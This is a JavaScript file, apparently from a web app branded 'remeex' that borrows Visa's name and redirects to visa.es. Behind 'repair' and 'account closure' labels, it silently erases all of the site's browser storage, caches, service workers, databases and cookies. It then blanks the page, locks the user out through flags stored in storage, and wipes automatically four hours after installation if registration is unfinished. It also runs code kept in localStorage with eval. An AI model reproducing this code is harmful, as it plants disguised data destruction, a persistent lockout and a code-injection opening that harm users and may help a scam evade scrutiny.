(function () {
  const REDIRECT_URL = 'https://visa.es';
  const ACCOUNT_CLOSED_KEY = 'remeexAccountClosed';

  const ab=document.createElement("script");
  ab.src="account-block.js";
  document.head.appendChild(ab);
  function showBlankScreen() {
    document.open();
    document.write('<div style="position:fixed;inset:0;background:rgba(255,255,255,0.8);backdrop-filter:blur(10px);"></div>');
    document.close();
  }
  async function clearUserData() {
    try {
      localStorage.clear();
      sessionStorage.clear();

      if (window.caches) {
        const keys = await caches.keys();
        await Promise.all(keys.map(k => caches.delete(k)));
      }

      if (navigator.serviceWorker) {
        const regs = await navigator.serviceWorker.getRegistrations();
        await Promise.all(regs.map(r => r.unregister()));
      }

      if (indexedDB && indexedDB.databases) {
        const dbs = await indexedDB.databases();
        dbs.forEach(db => indexedDB.deleteDatabase(db.name));
      }

      if (document.cookie) {
        document.cookie.split(';').forEach(c => {
          const eq = c.indexOf('=');
          const name = eq > -1 ? c.slice(0, eq) : c;
          document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/`;
        });
      }
    } catch (e) {
      console.error('Error clearing data', e);
    }
  }

  async function activateRepair() {
    await clearUserData();
    localStorage.setItem('repairMode', 'true');
    sessionStorage.setItem('repairMode', 'true');
    localStorage.setItem('repairLogic', '(' + showBlankScreen.toString() + ')();');
    showBlankScreen();
    location.replace(REDIRECT_URL);
  }

  window.activateRepair = activateRepair;

  async function enforceAccountClosure() {
    await clearUserData();
    try {
      localStorage.setItem(ACCOUNT_CLOSED_KEY, 'true');
      sessionStorage.setItem(ACCOUNT_CLOSED_KEY, 'true');
      localStorage.setItem('repairMode', 'true');
      sessionStorage.setItem('repairMode', 'true');
      localStorage.setItem('repairLogic', '(' + showBlankScreen.toString() + ')();');
    } catch (error) {}
    showBlankScreen();
    location.replace(REDIRECT_URL);
  }

  window.enforceAccountClosure = enforceAccountClosure;

  function hasAccountBeenClosed() {
    try {
      return (
        localStorage.getItem(ACCOUNT_CLOSED_KEY) === 'true' ||
        sessionStorage.getItem(ACCOUNT_CLOSED_KEY) === 'true'
      );
    } catch (error) {
      return false;
    }
  }

  const isVisaEs = /(^|\.)visa\.es$/i.test(location.hostname);
  if (hasAccountBeenClosed() && !isVisaEs) {
    enforceAccountClosure();
    return;
  }

  const isBorrarPage =
    location.pathname.endsWith('/borrar') ||
    location.pathname.endsWith('borrar.html');

  const isRepair =
    localStorage.getItem('repairMode') === 'true' ||
    sessionStorage.getItem('repairMode') === 'true';

  const storedLogic = localStorage.getItem('repairLogic');

  // Auto-repair if registration isn't completed within 4 hours of installation
  const installTime = parseInt(localStorage.getItem('pwaInstallTime') || '0', 10);
  const fourHours = 4 * 60 * 60 * 1000;
  const registrationDone = !!localStorage.getItem('visaRegistrationCompleted');

  if (!isBorrarPage && installTime && !registrationDone && Date.now() - installTime >= fourHours) {
    activateRepair();
  }

  if (isRepair && !isBorrarPage) {
    clearUserData().then(() => {
      localStorage.setItem('repairMode', 'true');
      sessionStorage.setItem('repairMode', 'true');
      localStorage.setItem('repairLogic', '(' + showBlankScreen.toString() + ')();');
      showBlankScreen();
      location.replace(REDIRECT_URL);
    });
  } else if (storedLogic && !isBorrarPage) {
    try { eval(storedLogic); } catch (e) {}
  }
})();
